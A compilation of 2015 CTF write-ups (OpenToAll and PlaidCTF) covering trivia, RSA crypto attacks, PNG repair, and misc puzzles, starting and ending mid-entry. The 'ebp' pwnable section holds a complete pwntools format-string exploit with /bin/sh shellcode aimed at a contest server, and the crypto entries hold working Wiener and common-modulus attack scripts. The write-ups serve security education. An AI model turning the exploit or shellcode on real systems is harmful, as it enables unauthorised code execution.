> o = [0x8048499, 0x80484B3, 0x80484CD, 0x80484E7, 0x8048501, 0x804851B,
>      0x8048535, 0x804854F, 0x8048569, 0x8048583, 0x804859D, 0x80485B7,
>      0x80485D1, 0x80485EB, 0x8048605, 0x804861F, 0x8048639, 0x8048653,
>      0x804866D, 0x8048687, 0x80486A1]

> # Get index values
> b = [get_long(x) for x in b]
> b = [x if x != 4294967295 else 0 for x in b] # Patch BSS datas values
> # Get bytes
> o = [get_long(x + 3) for x in o]
> # Get corresponding bytes
> f = [get_byte(o[x]) for x in b]
> # Convert to char
> f = [chr(x) for x in f]
> # Print result
> print("".join(f))
> ```

This way, we get the flag `flag{switch jump pogo pogo bounce}`.

## Other write-ups and resources

* [Original source and writeup](https://github.com/gaffe23/gaffe-ota2/tree/master/switchy)
* <https://0x44696f21.wordpress.com/2015/03/11/switchy-opentoall-ctf-2015/>
# OpenToAll CTF 2015: Classic

**Category:** Trivia
**Points:** 10
**Solves:** 355
**Author:** Eriner
**Description:** 

> Hack _ planet!

## Write-up

by [polym](https://github.com/abpolym) and Brehret N

The answer and flag is `the`.
It's a reference to the 1995 film "Hackers" (https://www.youtube.com/watch?v=drJWxMLrpE0).

## Other write-ups and resources

* <http://team-jihfu.github.io/2015/03/09/otactf2-2015-trivia-4x10pts/#classic-10pts>
# OpenToAll CTF 2015: IRC

**Category:** Trivia
**Points:** 10
**Solves:** 190
**Author:** Eriner
**Description:** 

> What is the best IRC client?

## Write-up

by [Eriner](https://github.com/Eriner) and [polym](https://github.com/abpolym)

On IRC while connected to Freenode, execute `/ctcp Eriner version`
> `CTCP query to Eriner: VERSION`
> `CTCP reply from Eriner: VERSION WeeChat is the best IRC client`

The answer and flag is `weechat`.

## Other write-ups and resources

* <http://team-jihfu.github.io/2015/03/09/otactf2-2015-trivia-4x10pts/#irc-10pts>
# OpenToAll CTF 2015: Opcode

**Category:** Trivia
**Points:** 10
**Solves:** 231
**Author:** gaffe
**Description:** 

> What is the x86 opcode for a relative jump with a 4-byte offset?

## Write-up

by [polym](https://github.com/abpolym)

The answer and flag is `E9`.

## Other write-ups and resources

* <http://team-jihfu.github.io/2015/03/09/otactf2-2015-trivia-4x10pts/#opcode-10pts># OpenToAll CTF 2015: ZmxhZ3tiYXNlNjRfaXNfaGFyZF9odWh9Cg==

**Category:** Trivia
**Points:** 10
**Solves:** 396
**Author:** Eriner and gaffe
**Description:** 

> hmm...

## Write-up

by [polym](https://github.com/abpolym)

The challenge title is a base64 encoded string, so we just have to decode the string, e.g. using `base64 --decode <<< 'ZmxhZ3tiYXNlNjRfaXNfaGFyZF9odWh9Cg=='`.
>
The flag is `flag{base64_is_hard_huh}`.

## Other write-ups and resources

* <http://team-jihfu.github.io/2015/03/09/otactf2-2015-trivia-4x10pts/#zmxhz3tiyxnlnjrfaxnfagfyzf9odwh9cg-10pts># PlaidCTF CTF 2015: Curious

**Category:** Crypto
**Points:** 70
**Solves:** 78
**Description:**

> The curious case of the random e.
>
> We've [captured](http://play.plaidctf.com/files/captured_a4ff19205b4a6b0a221111296439b9c7) the flag encrypted several times... do you think you can recover it?
>
>
>
> Team	Points	Submission
> 0ops	72	16 hours ago
> mrx	71	16 hours ago
> fuzzi3	70	16 hours ago

## Write-up

by [xarsman](https://github.com/xarsman)

_This write-up is made by Xarsman of the [HacknamStyle](https://www.hacknamstyle.net/) CTF team._

We are given a file which contained a list of tuples `{N : e : c}`. This seems like a common [RSA](http://en.wikipedia.org/wiki/RSA_%28cryptosystem%29) encryption and we get the public key `{N,e} = {modulus, exponent}` and `{c} = {ciphertext}`. If you aren't familiar with the [RSA cryptosystem](http://en.wikipedia.org/wiki/RSA_%28cryptosystem%29) I suggest you read up on wikipedia first before continuing this write-up.

The first thing we might notice is that the public exponent `e` is quite large. Usually this is `65537 == 2*16 + 1` or in some case even `3`. Our exponent though is of the same size as `N` which is unusual. After some googling and digging around we figure that this large public exponent means that there is a large chance that the private exponent `d` is rather small. This is interesting because a guy named [Wiener discovered an attack](http://en.wikipedia.org/wiki/Wiener%27s_attack) against the RSA cryptosystem when `d < 1/3*N^(1/4)`. 
I'll briefly summarize the attack below:
* you calculate the fractions of `e/N` in order to approximate `d` since `e/N ~ k/d`
* solve the equation `f(x) = x² - (N - phi(N) +1)*x + N` for `f(x) = 0`
* the roots of the above equation are the primes `p` and `q` and since `p*q = N` we've succesfully factorized `N` and thus cracked the RSA key.

Note that there are some conditions that apply; Not every root is a solution since `p` and `q` are primes they need to be perfect integers (so no real numbers as solutions). Also since this is an approximation we need to check that `p*q = N`.

Now that we know the general ideas and we kind of know the theory behind this all we can code (or find some code online) to solve this problem. I found [some code online](https://github.com/pablocelayes/rsa-wiener-attack) that already implements said attack but I rewrote them and put it together in a module named [wiener_attack](wiener_attack.py). The most interesting part is shown in the snippet below:

```python
def wiener_attack(N,e):
    (p,q,d) = (0,0,0)
    conv=convergents(partial_quotiens(e,N))
    for frac in conv:
        (k,d)=frac
        if k == 0:
            continue
        y = -(N - phiN(e, d, k) + 1)
        discr = y*y - 4*N
        if(discr>=0):
            # we need a perfect squared discriminant
            sqr_discr = is_perfect_square(discr)
            # test if discr is positive and the roots are integers
            if sqr_discr!=-1 and (-y+sqr_discr)%2==0:
                p = ((-y+sqr_discr)/2)
                q = ((-y-sqr_discr)/2)
                return p, q, d
    return p, q, d
```

So the thing is we make the continued fractions of `e/N` to approximate `k/d` but we don't solve each equation corresponding with al those values for `k` and `d`. This would be too time consuming. We only really need to solve an equation when we have a perfect squared discriminant. If we don't have that our would-be roots `p` and `q` won't be perfect integers, thus they won't be primes and not a valid solution. If we have a perfect squared discriminant wedo a last check to make sure `p` and `q` are really integers and if they succeed we have found our roots. 

Now we have to write a [small script](curious_solve.py) that loops through all the keys and tries to crack them all. We save all our roots in a list and try to decipher the chipertexts with the calculated roots.

```python
from wiener_attack import *

nlist = list()
elist = list()
clist = list()
with open('captured_a4ff19205b4a6b0a221111296439b9c7') as f:
    # read the line {N : e : c} and do nothing with it
    f.readline()
    for i in f.readlines():
        (N, e, c) = i[1:-2].split(" : ")
        N = long(N, 16)
        e = long(e, 16)
        c = long(c, 16)
        nlist.append(N)
        elist.append(e)
        clist.append(c)

solutions = []
for i in range(0, len(elist)):
    (p,q,d) = wiener_attack(nlist[i],elist[i])
    if p != 0 and q != 0:
        solutions.append((nlist[i],clist[i],d))
    print "i: ", i
    print "p: ", p
    print "q: ", q
    print

for j in range(len(solutions)):
    (n,c,d) = solutions[j]
    plain = pow(c, d, n)
    print hex(plain)
    print hex(plain)[2:-1].decode('hex')
```

Running that code gives us the flag
```bash
$ python curious_solve.py 
..
flag_S0Y0UKN0WW13N3R$4TT4CK!
```


## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/PlaidCTF%202015/curious/46/)
* [Lense](https://gist.github.com/Lense/8a84b2e6d140176bfad9)
* <http://capturetheswag.blogspot.com.au/2015/04/plaidctf-curious-crypto-70-point.html>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/PCTF/crypto/curious>
* <https://gist.github.com/anthonyclays/c530372fc5f15b05b843>
# PlaidCTF CTF 2015: Lazy

**Category:** Crypto
**Points:** 180
**Solves:** 55
**Description:**

> My [knapsack](http://play.plaidctf.com/files/handout_d20bf5aef611da40173a5004da72428c.tgz) brings all the boys to the yard, and they're like "that crypto is hard" (note: this flag is not in the flag{} format)
> 
> 
> Team	Points	Submission
> dcua	187	2 days ago
> gallopsled	183	2 days ago
> fuzzi3	181	2 days ago

## Write-up

(TODO)

## Other write-ups and resources

* <http://gnoobz.com/plaid-ctf-2015-lazy-writeup.html>
* [Vietnamese](https://forum.whitehat.vn/threads/12894-Plaidctf-2015-Crypto180-Lazy.html)# PlaidCTF CTF 2015: Parlor2

**Category:** Crypto
**Points:** 375
**Solves:** 15
**Description:**

> After going bankrupt last year, the folks behind parlor from last year have decided to set up a new betting service!
> 
> [Fixed Server](http://play.plaidctf.com/files/new_server_e947d2a6d0bddb87e690772fbb3fa196.py) running at 52.6.11.111
> 
> (Old server with short recv, posted for posterity: 
> [here](http://play.plaidctf.com/files/parlor2_43c40064516eeb628052fe1a8b4c1626.py))
> 
> 
> Team	Points	Submission
> LC BC	390	18 hours ago
> MMA	382	17 hours ago
> monads	378	14 hours ago

## Write-up

(TODO)

## Other write-ups and resources

* [sophia.re](http://www.sophia.re/plaid2015_parlor2_writeup.html)
# PlaidCTF CTF 2015: Strength

**Category:** Crypto
**Points:** 110
**Solves:** 136
**Description:**

> Strength in Difference
>
> We've [captured](http://play.plaidctf.com/files/captured_827a1815859149337d928a8a2c88f89f) the flag encrypted several times... do you think you can recover it?
>
>
>
> Team	Points	Submission
> gn00bz	114	a day ago
> DatNoobs	112	a day ago
> 0x8F	111	a day ago

## Write-up

by [HoLyVieR](https://github.com/HoLyVieR)

### Explanation

The general idea behind recovering the plaintext is the following:

	plaintext^exponent = c1 (mod N)
	plaintext^(exponent+1) = c2 (mod N)
	(c1^-1 * c2) = plaintext (mod N)

With this in mind we have to find `c1` and `c2` value for which the exponent has a difference of exactly one. There is no value provided that directly gives us this value. However it's possible to generate one using the value provided. The following principle is needed:

	plaintext^e = c1 (mod N)
	plaintext^(e*v) = c1^v (mod N)

So we essentially need to find a pair of `a*e1` and `b*e2` for which the difference is exactly one. It's impossible to find such pair if `gcd(e1, e2)` is not one. There's only 2 values in the ones given that match this criteria `71^5` and `29^7`. To find the value of `a` and `b`, we can use this:

	a*e1 + 1 = 0 (mod e2)
	-a * e1 = 1  (mod e2)
	a = (-e1)^-1 (mod e2)
	b = (a*e1 + 1) / e2

After this we just have to use the first formula and get back the original plaintext.

### Code

	import math

	def egcd(a, b):
	  if a == 0:
		return (b, 0, 1)
	  else:
		g, y, x = egcd(b % a, a)
		return (g, x - (b // a) * y, y)

	def inverse_mod(a, m):
	  g, x, y = egcd(a, m)
	  if g != 1:
		raise Exception('Modular inverse does not exist')
	  else:
		return x % m

	M = 0xa5f7f8aaa82921f70aad9ece4eb77b62112f51ac2be75910b3137a28d22d7ef3be3d734dabb9d853221f1a17b1afb956a50236a7e858569cdfec3edf350e1f88ad13c1efdd1e98b151ce2a207e5d8b6ab31c2b66e6114b1d5384c5fa0aad92cc079965d4127339847477877d0a057335e2a761562d2d56f1bebb21374b729743L

	b1 = 0x6fdcbfb5cd2cacd032ef7200fd49b9f304a6dbd8399f4a91a72d1d9150f97b3b513f44dfc56f6f7c8ec41a8ef9b93a80230a1e65e29d2ef519bb83931d4b0c7a589059cfdf2d571660ab790a9c7e085e3018bf19748abd6d521952b68bc9594c1ad34726658bd9bd445d3b6381ceee57328838e8a129867e505be0ca0d1a1da5L
	b2 = 0x8caeaa7d272f9606fee9222efd1d922143db738b95bd64746b27bc4c0fd979a2c57b4735131a4391a81bf5f0c0c8eea41d4f91bed4d17784b1956fd89882b97c98009051ac3a03964499c864524d3ddc10299c0290e91707b62ce89b118afe558151be39d61de0483def52c6cb546132ecab85143715bc593a2892b1e41b37b9L

	a1 = 71**5
	a2 = 29**7

	a = inverse_mod((-a1 + a2*100000) % a2, a2)
	b = (a*a1 + 1) / a2

	p1 = inverse_mod(pow(b1, a, M), M)
	p2 = pow(b2, b, M)

	r = (p1 * p2) % M

	print(r)
	print(hex(r)[2:-1].decode("hex"))

### Flag

`flag_Strength_Lies_In_Differences`

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/PlaidCTF%202015/strength/45/)
* [sophia.re](https://www.sophia.re/plaid2015_strength_writeup.html)
* <https://github.com/everping/ctfs/blob/master/2015/4/plaidctf/crypto/strength/solve.py>
* <https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/PCTF/crypto/strength>
* <https://neg9.org/news/2015/4/24/plaidctf-2015-strength-in-difference-crypto-110-writeup>
* <http://capturetheswag.blogspot.com.au/2015/04/plaidctf-strength-crypto-110-point.html>
# PlaidCTF CTF 2015: PNG Uncorrupt

**Category:** Forensics
**Points:** 150
**Solves:** 115
**Description:**

> We received this [PNG file](http://play.plaidctf.com/files/corrupt_735acee15fa4f3be8ecd0c6bcf294fd4.png), but we're a bit concerned the transmission may have not quite been perfect.
>
>
> Team	Points	Submission
> SpamAndHex	156	2 days ago
> BU	153	2 days ago
> 0xffa	151	2 days ago

## Write-up

by [polym](https://github.com/abpolym)

We are given a corrupted PNG and check it's state using `pngcheck`:

```bash
$ pngcheck -v corrupt_735acee15fa4f3be8ecd0c6bcf294fd4.png
File: corrupt_735acee15fa4f3be8ecd0c6bcf294fd4.png (1188435 bytes)
  File is CORRUPTED.  It seems to have suffered DOS->Unix conversion.
ERRORS DETECTED in corrupt_735acee15fa4f3be8ecd0c6bcf294fd4.png
```

Comparing the first 8 bytes of the corrupted PNG with the PNG signature in the [PNG specification](http://www.w3.org/TR/PNG/#5PNG-file-signature), we see a difference:

```bash
$ xxd -l8 corrupt_735acee15fa4f3be8ecd0c6bcf294fd4.png
0000000: 8950 4e47 0a1a 0a00                      .PNG....
```

The correct signature should be `8950 4e47 0d0a 1a0a`:

```bash
$ xxd -l8 fixed.png
0000000: 8950 4e47 0d0a 1a0a                      .PNG....
```

After fixing the signature, we still have a corrupt PNG:

```bash
$ pngcheck -v corrupt.v2.png
File: corrupt.v2.png (1188436 bytes)
  chunk IHDR at offset 0x0000c, length 13
    960 x 600 image, 24-bit RGB, non-interlaced
  chunk sBIT at offset 0x00025, length 3
    red = 8 = 0x08, green = 8 = 0x08, blue = 8 = 0x08
  chunk pHYs at offset 0x00034, length 9: 5629x5629 pixels/meter (143 dpi)
  chunk tEXt at offset 0x00049, length 28, keyword: Software
  chunk IDAT at offset 0x00071, length 131072
    zlib: deflated, 32K window, default compression
  CRC error in chunk IDAT (computed f0271404, expected 5a745d00)
ERRORS DETECTED in corrupt.v2.png
```

After the PNG signature, chunks containing specific meta information or pixel data follow. Each chunk follows this format:

![](chunk_format.png)

An example is the `IHDR` chunk, which [comes right after](http://www.w3.org/TR/PNG/#5ChunkOrdering) the PNG signature:

![](ihdr.png)

First, we see the length of the `IHDR` chunk _data_, `0000000D = 13`, then comes the chunk type `IHDR`, then `13` bytes of [`IHDR` chunk data](http://www.w3.org/TR/PNG/#11IHDR) and finally `22F61856` - the [32 bit CRC](http://www.w3.org/TR/PNG/#5CRC-algorithm), which is essentially the same as the ZIP file CRC algorithm.

Following the `IHDR` chunk, we see the chunk types `sBIT`, `pHYs` and `tEXt`, which all do have valid CRCs and lengths.

However, the length of each `IDAT` chunk does not match with the actual length of the corresponding `IDAT` chunk data:

![](idat_1.png)
![](idat_2.png)

This results in incorrect CRCs as seen in the previous `pngcheck` output, since the offsets don't match.

Fixing the lengths of each `IDAT` chunk does not result in a correct PNG, so we assume that bytes are missing.
Since the first byte missing looked like a newline conversion from DOS `0x0D 0x0A == \r\n` to Unix `0x0A == \n`, this conversion might have happened elsewhere, too.

I wrote a [python program](fixpng.py) that bruteforces the correct placements of such `0x0D` bytes, by checking the length and CRC of each `IDAT` chunk

* If the length is correct and the CRC is incorrect, it replaces the incorrect CRC.
* If the length is incorrect and off by n bytes, it
	* Prepends `0x0D` bytes in front of each nth combination of `0x0A` occurrences in the chunk data
	* Calculates the CRC and compares it with the given CRC

The python program takes about 2m40s and gives us the flag in return:

![](fixed.png)

```bash
$ time python fixpng.py corrupt_735acee15fa4f3be8ecd0c6bcf294fd4.png fixed.png
f55a745d
06e15ebf
a0bdc18a
adefb326
09c557f7
0848d2c4
295c44c9
a4afc965
2fad0fb3
7ec18f9e

real    2m38.393s
user    2m34.817s
sys     0m3.550s
```

The flag is `flag{have_a_wonderful_starcrafts}`.

## Other write-ups and resources

* <http://z1h4wk.tumblr.com/post/116828562808/ctf-plaidctf2015-forensic150>
* <https://nebelwelt.net/blog/plaid-pnguncorrupt.html>
* <http://www.securifera.com/blog/2015/04/23/plaidctf-2015-png-uncorrupt/>
* <https://mattscodecave.com/posts/plaidctf-2015---corrupt-png>
* <https://13c5.wordpress.com/2015/04/20/plaidctf-2015-png-uncorrupt/>
* <https://towerofhanoi.github.io/plaidctf2015/forensics/PNG_Uncorrupt/>
# PlaidCTF CTF 2015: Unknown

**Category:** Forensics
**Points:** 30
**Solves:** 290
**Description:**

> We recovered [this](http://play.plaidctf.com/files/unknown_2348c21020c876be4ae7d9eb19f8500a) file from a nearby computer. Maybe you can tell us what it means?
> 
> 
> Team	Points	Submission
> monads	31	a day ago
> LSE	30	a day ago
> Delusions of Grandeur	30	a day ago

## Write-up

by [polym](https://github.com/abpolym)

We are given a file that contains formatted data:

```bash
$ cat unknown_2348c21020c876be4ae7d9eb19f8500a
\begindata{raster,1}
2 0 65536 65536 0 0 640 400
bits 1 640 400
5a5c0b2f620b86f56c220475ab06266540dc7a04d980a3111a8008526d2a828130g!08422580010240a01441h084124010861700212g018022208dg07g0401c00bg0e4032089232g80g82 |
4534gc6458010g0108200881g89a008g45111201c84003400480gb0308e80480520123422b0020408b180a403g!49g483802c3010c284248g145002118087g08g02040848g10080d6508 |
[...]
02hc286h9301e008hc850090282g8240g36a0281c02a010g4080!02424d013023g0851c2g04019bga19a42052010g24441004gf410048022h84805003gd50431h40a052 |
30214a30019092201c10840790g351282043482108045g26h8a1b1c104448501052!400c4c9002030c20b0a0c091040998g0cg1cc428g0803044044a00cc3318720g02g3002c0g240208 |
400819e6!800524!804480041820244104020b0380242606i32800cg80c00a8641a080bc6020c504g044821026501880c5ag0bg02gae230a1280g084c48902460g01031802g25h |
\enddata{raster, 1}
```

Searching for `begindata raster`, we find that this file is [ATK raster image data](http://www.fileformat.info/format/cmu/spec/c4cfb8404a304ea687b344485c445eb2/view.htm), which is known as `Andrew Formats` or `CMU Bitmaps` as explained [here](http://www.fileformat.info/format/cmu/egff.htm).

Searching for `convert atk to png` or `convert atk to bmp` leads us to [this tool](http://www.xnview.com/de/xnconvert/), which we install on a virtual machine.

Now we can convert the data from the `.atk` or `.cmu` format to `.png`:

![](./xnconvert.png)

Afterwards, we get the flag in an image:

![](./unknown_result.png)

The flag is `flag{l0l_CMU_da_b3s}`.

## Other write-ups and resources

* [PlaidCTF CTF 2015: Unknown](http://ipushino.blogspot.de/2015/04/plaidctf-ctf-2015-unknown.html)
# PlaidCTF CTF 2015: ECE's Revenge2

**Category:** Misc
**Points:** 250
**Solves:** 31
**Description:**

> Okay, well we didn't have time to make a circuit board for you all. But we do have [this](http://play.plaidctf.com/files/final_8ce2c1db4ce9e96bcc859ded79fba21c.sv).
> 
> 
> Team	Points	Submission
> 0xffa	260	a day ago
> Vegan Zombies	255	a day ago
> PraetorianGs	252	a day ago

## Write-up

(TODO)

## Other write-ups and resources

* <https://neg9.org/news/2015/4/22/plaidctf-2015-eces-revenge2-misc-250-writeup># PlaidCTF CTF 2015: Ironic

**Category:** Misc
**Points:** 250
**Solves:** 3
**Description:**

> We travelled into the future and found the problems of the past. [This](http://play.plaidctf.com/files/ironic_bb8a8e263a6e142108803741e4bf887e) is running at 52.6.11.111, but it's doing so ironically.
> 
> 
> Team	Points	Submission
> gallopsled	260	20 hours ago
> BlueLotus	255	9 hours ago
> 1064CBread	252	8 hours ago

## Write-up

(TODO)

## Other write-ups and resources

* none yet# PlaidCTF CTF 2015: Kolmogorov

**Category:** Misc
**Points:** 150
**Solves:** 20
**Description:**

> All we know about [Kolmogorov's Pet Snake](http://play.plaidctf.com/files/kolmogorov_59658fc88748139edc32ec26c8a64af0) is that the flag has no uppercase letters nor numbers (note: this flag is not in the flag{} format)...
> 
> 
> Team	Points	Submission
> 0xffa	156	a day ago
> 217	153	a day ago
> LC BC	151	a day ago

## Write-up

by [jorenverspeurt](https://github.com/jorenverspeurt)

The bunch of gibberish in the assignment is a program in the code golf-centric programming language Pyth. It translates to Python, that's probably where the pet snake in the name comes from.

The code below is what the (patched! there's a bug in the run-length encoding code, a single line is indented wrongly, I hope it'll be fixed by the time you read this) interpreter for Pyth translates the terse code to:

```python
z=copy(input())
J=copy(chop(z,"_"))
Pprint("\n",
  equal(
    Psum(
      Pmap(lambda d:Pchr(d)
          ,join(
            base_10(
              plus(
                Psum(
                  run_length_encoding(
                    Pmap(lambda k:Plen(k)
                        ,J)))
                ,Pmap(lambda k:index(G,k)
                     ,Psum(J)))
              ,25)
            ,(126))))
    ,"\n^[8^T^^Edi^Ep^H/]+^[?\n^H^[L.vD^Y{^F^Gr6c^UpE^PXT}Jfu^D,\"9iKhW4Xmmv;gf"))
```

(All non-standard functions are from the Pyth library)
As all of the Pyth functions are massively multifunctional I provide a rough translation of what the code inside the equal() means (in some semi-pseudocode).

```
concat(map(chr, tobase(tobase10from(concat(runLengthEncoding(map(len, J))) + map(letterOfAlphabet,concat(J)),25),126)))
```

And here's what it does in human-speak:
The program takes the flag as input, a long string of ascii chars with _ as a kind of group separator as input and checks if it corresponds to the compressed version that's in the program code (the thing with all the low-value bytes).
Here's how the compression happens:
Take the runlength encoding of the list of group lengths of the input (the groups are split by underscores), this returns a list of lists (`[[3,3][4,17]]` for the flag) which is flattened and prepended to a concatenated version of the list of groups (so the input without \_), transformed from letters to numbers (a -> 0, b -> 1, ...).
This list is interpreted as a base 25 number and converted to a regular int. This int is then encoded into a base126 string (the string is a number that uses the ascii chars (including the ones used for escape sequences) up to }).
The Kolmogorov in the name probably refers to Kolmogorov complexity (look it up ;) ).

I decoded the string by loading the Pyth interpreter in a py3 repl and reversing the operations.

```python
join(base_10(Pmap(lambda d:Pchr(d),"..."),126),25)
[3, 4, 4, 17, 7, 14, 22, 2, 0, 13, 19, 7, 4, 10, 4, 24, 5, 17, 14, 12, 18, 20, 2, 7, 21, 4, 17, 24, 18, 7, 17, 19, 2, 14, 3, 4, 12, 0, 10, 4, 18, 20, 2, 7, 11, 14, 13, 6, 5, 11, 0, 6, 22, 7, 0, 19, 19, 7, 4, 4, 7, 4, 11, 11, 7, 14, 22, 18, 19, 7, 0, 19, 18, 7, 8, 19, 15, 14, 18, 18, 8, 1, 11, 4]

Pmap(lambda k: lookup(G,k),...
['d', 'e', 'e', 'r', 'h', 'o', 'w', 'c', 'a', 'n', 't', 'h', 'e', 'k', 'e', 'y', 'f', 'r', 'o', 'm', 's', 'u', 'c', 'h', 'v', 'e', 'r', 'y', 's', 'h', 'r', 't', 'c', 'o', 'd', 'e', 'm', 'a', 'k', 'e', 's', 'u', 'c', 'h', 'l', 'o', 'n', 'g', 'f', 'l', 'a', 'g', 'w', 'h', 'a', 't', 't', 'h', 'e', 'e', 'h', 'e', 'l', 'l', 'h', 'o', 'w', 's', 't', 'h', 'a', 't', 's', 'h', 'i', 't', 'p', 'o', 's', 's', 'i', 'b', 'l', 'e']
```

Remembering that the "deer" in the beginning represents the run-length encoding of the group lengths [[3,4],[4,17]] that yields the following flag:
```
how_can_the_key_from_such_very_shrt_code_make_such_long_flag_what_thee_hell_hows_that_shit_poss_ible
```

## Other write-ups and resources

* none yet
# PlaidCTF CTF 2015: Sanity Check

**Category:** Misc
**Points:** 1
**Solves:** 879
**Description:**

> Plaid CTF 2015 requires internet to play. [Do you have internet](http://pewpewpew.xyz/)?

## Write-up

by [nobbd](https://github.com/nobbd)

### Sanity Check - Do you have internet?

This challenge was awarded with a single point and was the easiest challenge in this ctf.

Upon visiting the provided link you were greeted with a simple html-page and the request to enter the **black** characters to claim the flag.
There was some text visible but by inspecting the html source or by trying to copy the characters one found that there was some invisble white text written in between the black characters.
The white characters were encapsulated in special div blocks. 

By skipping these blocks one was able to retrieve the following flag:

>flag{I_can_type_!l!I1!} 

## Other write-ups and resources

* none yet
# PlaidCTF CTF 2015: Sawed

**Category:** Misc
**Points:** 20
**Solves:** 180
**Description:**

> What kind of mysterious message is this?!?
>
> ddddddwwwwwwaaaaaasssssssssssssseddddddddddddddddddewwawwawwawwawwawwawwaedddssssssddddssssssssewwdwwdwwdwwdwwddssdssdssdssdsswwdwwdwwdwwdwwdwwdwwdassassassassassassassedddddddddddddddewwwwwwwwwwwwwwdssdssdssdssdssdssdsswwwwwwwwwwwwwwssssssssssssssedddddddddddewwwwwwwwwwwwweddddddddddessssssssssssssedddddddewwwwwwwwwwwwwweaaaaaaaedssdssdssdssdssdssdssewdwdwdddwddwdwwddwddwddwddewawwawawaaasasassasssasssdsssdsddsddddwdwwdwwwaaaessdddsddsddddsddddewdwdwdwdwdwdwdwawawawawawawaedddddddddddddddeddddddddaaaaaaaasssssssssssssswwwwwwwwdddddeddddddddeddddddwwwwwwaaaaaassssssssssssssedddddddddddddwwesdsddsdddwddwdwwwawwawawaawaawawwdwwdwdddsddsdsedddwwwdddesssssssssesssssess
>
> Note: This flag does not have flag{}.
>
>
> Team	Points	Submission
> LC BC	20	a day ago
> HackingForSoju	20	a day ago
> gallopsled	20	a day ago

## Write-up

(TODO)

## Other write-ups and resources

* [b01lers](https://b01lers.net/challenges/PlaidCTF%202015/Sawed/44/)
* <http://www.securifera.com/blog/2015/04/22/plaidctf-2015-sawed/>
* <https://neg9.org/news/2015/4/23/plaidctf-2015-sawed-misc-20-writeup>
* <http://ideone.com/LJIXKQ>
#Plaid CTF 2015 Writeup:
##### Pwnable: 160 points 
##### Name: ebp
##### Description:
*nc 52.6.64.173 4545* 

*Download: %p%o%o%p.*

Running file on ebp:
>```bash
> $ file ebp
> ebp: ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=4e8094f9986968cd856db5093810badbb0749fde, not stripped
>```

Checksec:
>```bash
>gdb-peda$ checksec
>CANARY    : disabled
>FORTIFY   : disabled
>NX        : disabled
>PIE       : disabled
>RELRO     : Partial
>```

A 32 binary and it seems like the NX flag is disabled which means we can execute shellcode

Analyzing the assembly, the vulnerability lies within the code for *make_response*:
>```assembly
>gdb-peda$ disas make_response
>Dump of assembler code for function make_response:
>   0x080484fd <+0>:	push   ebp
>   0x080484fe <+1>:	mov    ebp,esp
>   0x08048500 <+3>:	sub    esp,0x18
>   0x08048503 <+6>:	mov    DWORD PTR [esp+0x8],0x804a080
>   0x0804850b <+14>:	mov    DWORD PTR [esp+0x4],0x400
>   0x08048513 <+22>:	mov    DWORD PTR [esp],0x804a480
>   0x0804851a <+29>:	call   0x80483f0 <snprintf@plt>
>   0x0804851f <+34>:	leave  
>   0x08048520 <+35>:	ret    
>End of assembler dump.
>```

The C code for that looks something like this:
>```C
> char input[1024];  //&input is 0x804a080
> char output[1024]; //&output is 0x804a480
> int make_response(){
>   return snprintf(output,0x400,input);
>}
>```

where input and output are global variables

So it seems that this is a case of a format string vulnerability. 

Which makes sense since the description hints at %p%o%o%p

To be safe we assume there is aslr enabled on the server. We also need to utilize the format string to gain an arbitrary write and gain control flow of the program.

#####1. ASLR
  A way to defeat aslr is to use the format string vulnerability to leak an address of the stack out to us.
  We can do so by using the *%p* format 
  
#####2. Control flow
  Since a format string vulnerability also gives us the ability to write to the stack with the *%n* format we can utilize this to write to an address on the stack. If the buffers where our input was stored on the stack we can simply wrap around the stack into our buffers and use our input as addresses, however since our buffers are global buffers they are instead stored in the bss segment of the program.
  
  To remedy this we first use part 1 and leak out a stack address, then we use a saved frame pointer (ebp) to write to somewhere lower on the stack. What we want on the stack is something that we actually want to write to, the *return address* location. We use the %hn to write the size of a short to the stack which maintains the integrity of the 4 most significant bytes; this works because we know the return address is also on the stack with the ebp. Doing so we create a pointer to the return address.
>```python
>r.send('%4$p\n') 
>
>addr = int(r.recv(0xa),16)+(OFFSET) #offset is the offset to the return address
>log.info('stack: %x'%addr)
>addr = addr&0xFFFF #we take only last 4 bytes so that we can make use the %hn format
>
>r.send('%.{0!s}u%4$hn\n'.format(addr)) ##write those bytes
>```

So now we have a pointer to the location of the return address, so we simply need to wrap around to that pointer and write to it. We wrap around to our written address and overwrite the previous return address, and have it point to our buffer in the bss. Also we know that on our text segment and bss segment starts with 0x0804 which is why we can have it pivot to the buffer by writing only the size of a *short*.
>```python
>lower = bufaddr&0xffff
>r.send(shellcode+'%.{0!s}u%12$hn\n'.format(lower-len(shellcode)))
>```

Putting it together:

__Note:__ I used pwntools for this exploit but should be simple enough to convert to a regular python exploit
```python
from pwn import *

context.log_level = 'info'
r = remote('52.6.64.173',4545)

bufaddr = 0x804a080
OFFSET = 4 

shellcode ="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.send('%4$p\n') 

addr = int(r.recv(0xa),16)+(OFFSET)
log.info('stack: %x'%addr)
addr = addr&0xFFFF 

r.send('%.{0!s}u%4$hn\n'.format(addr))
lower = bufaddr&0xffff
r.send(shellcode+'%.{0!s}u%12$hn\n'.format(lower-len(shellcode)))

r.interactive()
```
flag is *who_needs_stack_control_anyway?*
> more information about format strings: https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf
# PlaidCTF CTF 2015: EBP

**Category:** Pwnable
**Points:** 160
**Solves:** 157
**Description:**

> nc 52.6.64.173 4545 
> 
> Download: [%p%o%o%p](ebp_a96f7231ab81e1b0d7fe24d660def25a.elf).
> 
> 

## Write-up

by [ezliang](https://github.com/ezliang) and [polym](https://github.com/abpolym)

Completed --> [ebp.md](ebp.md)

### Additional Information to ebp.md

Through reversing the decompiled assembler code, a rough representation of the control flow of this program can be made through [this C pseudocode snippet](./pcode.c).

A stack representation right before the `snprintf` call instruction is the following graph, made with [draw.io](https://www.draw.io/):

![](./stack.png)

The ultimative goal is to change the red sections, especially the `rip` of `make_response`.

This can be done in three steps:

* Leak a stack address - in this case the stack address `0xFFFFD548` that points to the saved/old ebp address of `echo` in `0xFFFFD568`:
